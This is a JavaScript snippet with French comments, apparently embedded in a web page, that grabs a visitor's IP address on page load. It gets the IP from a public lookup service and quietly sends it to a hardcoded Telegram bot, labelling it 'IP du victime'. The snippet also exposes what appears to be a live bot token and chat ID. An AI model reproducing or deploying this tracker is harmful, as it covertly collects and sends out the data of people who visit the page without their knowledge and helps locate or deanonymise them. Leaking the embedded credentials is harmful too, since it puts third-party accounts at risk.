const BOT_TOKEN = '7990929037:AAGvc5oMgBjTw5cjfayR8nsGuOXmU2N59SE'; // Remplacez par votre token de bot
        const CHAT_ID = '7879061625'; // Remplacez par votre ID de chat

        // Fonction pour envoyer un message à Telegram
        function sendMessageToTelegram(ip) {
            const message = `IP du victime : ${ip}`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message envoyé à Telegram:', data);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
            });
        }

        // Récupérer l'adresse IP
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                document.getElementById('ip').textContent = ip;

                // Envoyer l'adresse IP à Telegram
                sendMessageToTelegram(ip);
            })
            .catch(error => {
                console.error('Erreur lors de la récupération de l\'IP:', error);
            });